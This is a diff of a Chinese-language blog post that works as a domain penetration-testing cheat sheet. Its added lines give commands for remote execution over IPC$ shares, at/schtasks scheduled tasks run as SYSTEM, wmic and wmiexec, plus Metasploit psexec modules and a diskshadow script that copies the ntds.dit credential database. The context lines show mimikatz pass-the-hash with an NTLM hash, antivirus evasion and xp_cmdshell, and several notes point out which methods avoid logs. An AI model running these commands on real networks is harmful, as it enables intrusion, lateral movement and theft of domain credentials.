@@ -84,7 +84,7 @@
             <h1>域渗透常用命令</h1>
             <span class="meta">
             	Posted on
-              2020-07-15，7 min read
+              2020-07-15，8 min read
             </span>
           </div>
         </div>
@@ -138,6 +138,29 @@ net config workstation
 查看当前登陆域
 dnsdump.exe -u 域名\与用户 -p 域密码 域控机器名
 用普通域用户获取域内所有DNS解析
+</code></pre>
+<h1 id="ipc">IPC</h1>
+<pre><code>net use \\IP\ipc$ &quot;密码&quot; /user:administrator
+#建立IPC连接
+net time \\IP
+#获取远程IP的时间
+copy calc.bat \\IP\C$
+#把本地的calc.bat传到目标C盘
+at \\IP 21:41 c:\calc.bat
+#创建计划任务
+at \\IP 21:41 cmd.exe /c  &quot;ipconfig &gt; c:\1.txt&quot;
+#直接执行命令
+type \\IP\C$\1.txt
+#获取命令执行结果
+schtasks /create /s IP /tn 计划任务名 /sconstart /tr c:\calc.bat /ru system /f
+#用schtasks命令创建计划任务
+schtasks /delete /s IP /tn &quot;计划任务名&quot; /f 
+</code></pre>
+<p>WMICEXEC</p>
+<pre><code>wmic /node:IP /user:administrator /password:password process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;
+type \\IP\C$\ip.txt
+系统自带的WMIC命令。执行无日志
+wmiexec.py Username:Password@IP
 </code></pre>
 <h1 id="免杀">免杀</h1>
 <pre><code>use evasion/windows/windows_defender_exe
@@ -194,6 +217,11 @@ psesec.exe -accepteula \\dc.abc.com -s cmd.exe
 #提升权限
 sekurlsa::pth /user:dbadmin /domain:offensive.local /ntlm:161cff084477fe596a5db81874498a24 /run:powershell.exe
 #mimikatz执行
+psexec会被日志纪录
+</code></pre>
+<p>msf中也有模块</p>
+<pre><code>exploit/windows/smb/psexec
+exploit/windows/smb/psexec_psh(Powershell版本)
 </code></pre>
 <h1 id="ptt票据传递攻击">PTT(票据传递攻击)</h1>
 <p>白银票据：<br>
@@ -241,6 +269,20 @@ RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
 </code></pre>
 <h1 id="ntdsdit">ntds.dit</h1>
+<p>用自带的工具diskshadow</p>
+<pre><code>c:\common.txt
+
+set context persistent nowriters
+add volume c: alias someAlias
+create
+expose %someAlias% i:
+exec &quot;cmd.exe&quot; /c copy i:\windows\ntds\ntds.dit c:\ntds.dit
+delete shadows all
+reset
+exit
+</code></pre>
+<p>然后去c:/windows/system32执行<code>diskshadow /s c:\command.txt</code><br>
+就能得到ntds.dit</p>
 <pre><code>. .\Invoke-NinjaCopy.ps1
 #导入脚本
 Invoke-NinjaCopy -Path C:\Windows\NTDS\ntds.dit -Verbose -LocalDestination 'C:\Users\dbadmin\Desktop    \ntds.dit'
